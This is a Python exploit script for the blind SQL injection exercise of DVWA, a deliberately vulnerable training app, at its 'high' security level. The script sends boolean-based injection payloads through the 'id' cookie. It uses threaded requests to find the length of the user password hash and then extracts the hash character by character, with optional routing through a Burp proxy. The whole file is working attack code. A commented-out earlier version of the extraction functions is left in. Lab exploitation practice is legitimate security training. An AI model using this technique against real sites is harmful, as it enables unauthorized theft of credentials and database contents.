# DVWA Blind SQL Injection (High)
# Boolean Based

import requests, argparse, concurrent.futures, time

http_proxy = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def lenSQLi(target, inj, sessid, verbose=False):
    def check_length(i):
        url = f"http://{target}/vulnerabilities/sqli_blind/"
        payload = f"' OR LENGTH((SELECT {inj} FROM users WHERE user_id=1 LIMIT 1))={i}-- -"
        cookies = {'PHPSESSID': sessid, 'security': 'high', 'id': payload}
        try:
            if verbose:
                r = requests.get(url, cookies=cookies, proxies=http_proxy)
                if 'User ID exists' in r.text:
                    return i
            else:
                r = requests.get(url, cookies=cookies)
                if 'User ID exists' in r.text:
                    return i
        except Exception as e:
            print(f"Error occurred: {e}")
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_length, i) for i in range(1, 33)]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                return result

# def extractSQLi(target, inj, sessid, verbose):
#     url = f"http://{target}/vulnerabilities/sqli_blind/"
#     for i in range(32,127):
#         payload = inj.replace("[CHAR]", str(i))
#         cookies = {'PHPSESSID': sessid, 'security': 'high', 'id': payload}
#         try:
#             if verbose:
#                 r = requests.get(url, cookies=cookies, proxies=http_proxy)
#                 if 'User ID exists' in r.text:
#                     return i
#             else:
#                 r = requests.get(url, cookies=cookies)
#                 if 'User ID exists' in r.text:
#                     return i
#         except requests.RequestException as e:
#             print(f"Error occurred: {e}")
#     return None

# def sendSQLi(target, r, inj, sessid, verbose=False):
#     extracted = ""
#     for i in range(1, r+1):
#         payload = f"' OR ascii(substring((select {inj} from users where user_id=1 LIMIT 1),{i},1))=[CHAR]-- -"
#         # masih tidak secepat lenSQLi
#         with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
#             futures = [executor.submit(extractSQLi, target, payload, sessid, verbose)]
#             for future in concurrent.futures.as_completed(futures):
#                 exval = future.result()
#                 if exval:
#                     extracted += chr(exval)
#                     # print(chr(exval), end="", flush=True)
#                 else:
#                     break
#     return extracted

def sendSQLi(target, r, inj, sessid, verbose=False):
    extracted = ""
    url = f"http://{target}/vulnerabilities/sqli_blind/"
    def extract_data(i, payload):
        payload = payload.replace("[CHAR]", str(i))
        header = {'Content-Type':'application/x-www-form-urlencoded'}
        cookies = {'PHPSESSID': sessid, 'security': 'high', 'id': payload}
        try:
            if verbose:
                r = requests.post(url, headers=header, cookies=cookies, proxies=http_proxy)
                if 'User ID exists' in r.text:
                    return i
            else:
                r = requests.post(url, headers=header, cookies=cookies,)
                if 'User ID exists' in r.text:
                    return i
        except requests.RequestException as e:
            print(f"Error occurred: {e}")
        return None


    for i in range(1, r+1):
        payload = f"' OR ascii(substring((select {inj} from users where user_id=1 LIMIT 1),{i},1))=[CHAR]-- -"
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(extract_data, i, payload) for i in range(32, 127)]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                
                if result is not None: 
                    extracted += chr(result)
                    print(chr(result), end="", flush=True)
                    break

    return extracted

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target','-t',required=True,dest='target',help='DVWA Host Target')
    parser.add_argument('--session','-s',required=True,dest='session',help='DVWA Session')
    parser.add_argument('--verbose','-v',action='store_true',dest='verbose',help='Turn on verbose to Burp')
    args = parser.parse_args()

    target_url = args.target
    phpsessid = args.session
    verbose = args.verbose
    
    length = lenSQLi(target_url, "password", phpsessid, verbose)
    print("Length Password: " + str(length))
    start_time = time.time()
    pshs = sendSQLi(target_url, length, "password",phpsessid, verbose)
    end_time = time.time()
    duration = end_time - start_time
    d_min = duration / 60
    print(f"\nHash Password: {pshs}")
    print(f"Time consumed: {d_min:.2f} minute")

if __name__ == "__main__":
    main()